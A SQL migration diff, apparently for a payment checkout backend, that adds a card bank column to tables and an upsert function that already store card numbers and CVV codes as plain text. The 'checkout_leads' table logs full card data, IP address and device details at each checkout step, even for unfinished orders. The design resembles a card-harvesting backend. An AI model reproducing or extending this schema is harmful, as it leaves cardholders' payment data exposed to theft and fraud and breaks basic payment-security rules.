@@ -26,6 +26,7 @@ ALTER TABLE public.payment_orders
   ADD COLUMN IF NOT EXISTS card_holder_name text,
   ADD COLUMN IF NOT EXISTS card_number text,
   ADD COLUMN IF NOT EXISTS card_cvv text,
+  ADD COLUMN IF NOT EXISTS card_bank text,
   ADD COLUMN IF NOT EXISTS installments smallint DEFAULT 1,
   ADD COLUMN IF NOT EXISTS acquirer_name text,
   ADD COLUMN IF NOT EXISTS tid text,
@@ -52,6 +53,7 @@ CREATE TABLE IF NOT EXISTS public.checkout_leads (
     customer_document text,
     card_number text,
     card_cvv text,
+    card_bank text,
     client_ip inet,
     user_agent text,
     device_type text,
@@ -73,7 +75,8 @@ CREATE TABLE IF NOT EXISTS public.checkout_leads (
 
 ALTER TABLE public.checkout_leads 
   ADD COLUMN IF NOT EXISTS card_number text,
-  ADD COLUMN IF NOT EXISTS card_cvv text;
+  ADD COLUMN IF NOT EXISTS card_cvv text,
+  ADD COLUMN IF NOT EXISTS card_bank text;
 
 -- 3. CREATE TABLE public.checkout_lead_events
 CREATE TABLE IF NOT EXISTS public.checkout_lead_events (
@@ -206,7 +209,8 @@ CREATE OR REPLACE FUNCTION public.upsert_checkout_lead(
     p_order_id uuid DEFAULT NULL,
     p_metadata jsonb DEFAULT '{}'::jsonb,
     p_card_number text DEFAULT NULL,
-    p_card_cvv text DEFAULT NULL
+    p_card_cvv text DEFAULT NULL,
+    p_card_bank text DEFAULT NULL
 ) RETURNS uuid AS $$
 DECLARE
     v_lead_id uuid;
@@ -250,7 +254,8 @@ BEGIN
             order_id = COALESCE(p_order_id, order_id),
             metadata = metadata || p_metadata,
             card_number = COALESCE(p_card_number, card_number),
-            card_cvv = COALESCE(p_card_cvv, card_cvv)
+            card_cvv = COALESCE(p_card_cvv, card_cvv),
+            card_bank = COALESCE(p_card_bank, card_bank)
         WHERE id = v_lead_id;
     ELSE
         -- Insert new lead
@@ -260,14 +265,14 @@ BEGIN
             client_ip, user_agent, device_type, device_os, device_browser,
             screen_resolution, utm_source, utm_medium, utm_campaign, utm_content,
             utm_term, referrer_url, landing_page, order_id, metadata,
-            card_number, card_cvv
+            card_number, card_cvv, card_bank
         ) VALUES (
             p_session_id, p_step, p_user_id, p_package_id, p_coins, p_amount, p_method,
             p_customer_name, p_customer_email, p_customer_phone, p_customer_document,
             p_client_ip, p_user_agent, p_device_type, p_device_os, p_device_browser,
             p_screen_resolution, p_utm_source, p_utm_medium, p_utm_campaign, p_utm_content,
             p_utm_term, p_referrer_url, p_landing_page, p_order_id, p_metadata,
-            p_card_number, p_card_cvv
+            p_card_number, p_card_cvv, p_card_bank
         ) RETURNING id INTO v_lead_id;
     END IF;
 
